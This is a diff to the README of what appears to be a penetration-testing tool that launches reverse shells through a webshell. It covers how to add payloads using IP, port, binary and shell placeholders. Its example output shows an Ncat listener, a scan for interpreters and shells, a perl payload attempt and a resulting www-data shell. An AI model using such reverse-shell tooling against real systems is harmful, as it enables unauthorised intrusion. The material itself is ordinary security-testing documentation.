@@ -39,7 +39,7 @@ The included payloads have all been tested on a simple webshell and work. If you
 
 - Edit the `data/payloads.py` file.
 - Add a new object to the `payloads` dict. The `key` should be the name of the bin, and the value should be a `list` object of payloads.
-- Replace all instances of the reverse `IP` with `IPHERE`, the port with `PORTHERE`, and the binary name with `PATHHERE`.
+- Replace all instances of the reverse `IP` with `IPHERE`, the port with `PORTHERE`, and the binary name with `PATHHERE`. If the payload specifies the shell replace it with `SHELLHERE`.
 
 ## Example
 
@@ -63,11 +63,11 @@ Verifying commands can be executed...
 Available interfaces...
 [-] lo
 [-] enp4s0
-[-] docker0
-[-] br-7436527ee366
 [-] br-aa3534e13396
 [-] br-c7551daa06d2
-[-] veth148b75b
+[-] docker0
+[-] br-a193929c6ae4
+[-] veth57bc03a
 docker0 selected. Address to use is 172.17.0.1
 Testing ports...
 [x] 1025 already in use or unavailable.
@@ -86,10 +86,14 @@ Ncat: Listening on 0.0.0.0:1026
 [-] ruby found at /usr/bin/ruby2.7
 [-] ruby found at /usr/bin/ruby
 [-] go found at /usr/bin/go
+Finding shells...
+[-] bash found at /bin/bash
+[-] sh found at /bin/sh
 Executing reverse shell...
 Bins to test: 7
+Shells to test: 2
 [!] Attempting perl payloads for path /usr/bin/perl
 Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:38870.
-$
+Ncat: Connection from 172.17.0.2:44590.
+www-data@122099e5b76d:/var/www/html$
 ```
